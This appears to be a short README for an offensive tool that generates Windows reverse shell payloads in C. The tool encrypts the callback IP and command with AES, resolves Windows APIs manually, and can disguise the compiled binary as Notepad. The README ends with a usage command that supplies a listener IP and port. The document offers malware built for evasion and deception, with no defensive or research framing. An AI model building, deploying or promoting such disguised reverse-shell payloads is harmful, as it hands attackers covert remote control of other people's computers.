# 🛡️ AES Encrypted Payload Generator

This tool generates a Windows reverse shell payload with **AES-encrypted IP and command values**, compiles it with optional **Notepad disguise**, and supports automatic cleanup.

---

## ⚙️ Features

- 🔐 AES (ECB mode) encryption for sensitive data
- 🧩 Dynamic payload generation in C
- 🪟 Native Windows API usage (with manual `GetProcAddress` resolution)
- 🎭 Optional Notepad spoofing (icon + metadata)
- 🛠️ Easy cross-compilation via MinGW (Linux)

---

## 🚀 Usage

### Basic Example
```bash
python3 payload_gen.py --ip 192.168.1.100 --port 4444 --notepad
```

